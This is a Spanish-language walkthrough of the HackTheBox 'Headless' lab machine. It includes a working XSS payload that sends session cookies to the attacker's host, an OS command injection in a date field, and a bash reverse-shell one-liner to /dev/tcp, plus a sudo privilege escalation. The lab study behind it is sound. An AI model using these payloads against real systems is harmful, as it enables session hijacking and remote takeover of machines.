---
title: "Headless"
date: 2024-06-13
draft: false
description: "Resoluciones de máquinas"
tags: ["Writeup", "HTB","Easy","Headless"]
---

## Reconocimiento

### Nmap

Escaneamos la maquina para ver que puertos tiene abiertos;

```shell
nmap -p- --open --min-rate 5000 -Pn -n 10.10.11.8
```

>Nota:
>
>**-p-**: El guion después de `-p` indica a `nmap` que debe escanear todos los puertos desde el 1 hasta el 65535
>
>**--open**: Filtra los resultados para mostrar solo los puertos abiertos, ignorando los puertos cerrados y filtrados
>
>**-sS**: El escaneo SYN es un tipo de escaneo que envía paquetes SYN y analiza las respuestas para determinar el estado de los puertos
>
>**--min-rate 5000**: Configura `nmap` para enviar al menos 5000 paquetes por segundo, acelerando el escaneo
>
>**-Pn**: Omite la etapa de ping para determinar si un host está activo, asumiendo que todos los hosts están activos. Esto es útil para escanear hosts que pueden estar configurados para no responder a pings
>
>**-n**: Evita la resolución de nombres DNS, acelerando el escaneo ya que no se espera a que se resuelvan los nombres de los hosts

![img](20240612214344.png)

Vemos que tiene el puerto `22` y `5000`

Suponemos que el puerto `5000` es de una web, vamos al navegador y ponemos la ip con el puerto `5000`:
![img](20240612214814.png)


Vamos a hacer **fuzzing** para ver que directorios podemos encontrar: 

### Gobuster

```shell
gobuster dir -u http://headless.htb:5000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20
```

![img](20240612215308.png)

Vemos 2 directorios vamos a ver que tiene cada uno:

----

`/support`:

![img](20240612215607.png)

Muy interesante esta página podemos enviar información

----

`/dashboard`:

![img](20240612215721.png)

Podemos ver que aquí no tenemos permiso de momento 

----

## Intrusión

Hemos visto que en `/support` hay un panel de soporte para enviar información, vamos a intentar un XSS para intentar robar alguna **cookie** de sesión:

Primero nos abrimos un servidor en *python* para que nos llegue la cookie:

```python
python3 -m http.server
```

![img](20240612220204.png)

### XSS

Ahora definimos el XSS:

```js
<script>
  var request = new XMLHttpRequest();
  request.open('GET', 'http://10.10.15.68/?coockie=' + document.cookie);
  request.send();
</script>
```

Con todo esto vamos a intentar robar alguna cookie:

![img](20240612220431.png)

Que interesante nos ha bloqueado estas entradas para el XSS

Vamos a pasar la petición por Burpsuite:

![img](20240612220620.png)

Visto esto vamos a intentar el mismo XSS pero en los demás campos:

![img](20240612220851.png)

Hemos probado en el User-Agent y nos ha llegado la cookie al servidor:

![img](20240612220935.png)

Con esta cookie de sesión vamos a probar a entrar al `/dashboard`:

![img](20240612221128.png)

Efectivamente tenemos acceso

## Explotación

Ahora que somos admin vemos una nueva pagina, vamos a pasar la petición del botón por Burpsuite:

![img](20240612221905.png)

### OS Command Injection

Por la estructura vemos que puede ser un `OS command injection`en el apartado de *date*, vamos a intentar ejecutar algún comando:

![img](20240612222126.png)

Efectivamente podemos inyectar comandos

Con esto vamos a pasarnos una shell:

```shell
bash -c "bash -i >& /dev/tcp/10.10.15.68/443 0>&1"
```

La url encodeamos:

```shell
bash+-c+"bash+-i+>%26+/dev/tcp/10.10.15.68/443+0>%261"
```

Primero nos ponemos en escucha por el puerto 443:

`nc lvnp 443`

![img](20240612222608.png)
Tenemos acceso!

## TTY Upgrade

`script /dev/null -c bash` 
`^z`
`stty raw -echo; fg`
`reset`
`xterm`
`export TERM=xterm SHELL=bash`

Ya tenemos la user flag:

![img](20240612222904.png)

## Escalada de Privilegios

Ponemos `sudo -l`  para ver si hay algo que se pueda ejecutar como `sudo` sin contraseña:

![img](20240612223051.png)

Efectivamente vamos a ver por dentro ese programa para ver como poder inyectar una bash:

![img](20240612223200.png)

Ahí podemos ver que si no hay `/usr/bin/pgrep` se ejecuta *initdb.sh*, vamos a poner `/bin/bash`dentro de *initdb.sh* y permisos de ejecución:

![img](20240612223435.png)

`chmod +x initdb.sh`

Ahora vamos a probar de ser root:

![img](20240612223717.png)
 Ya está!
 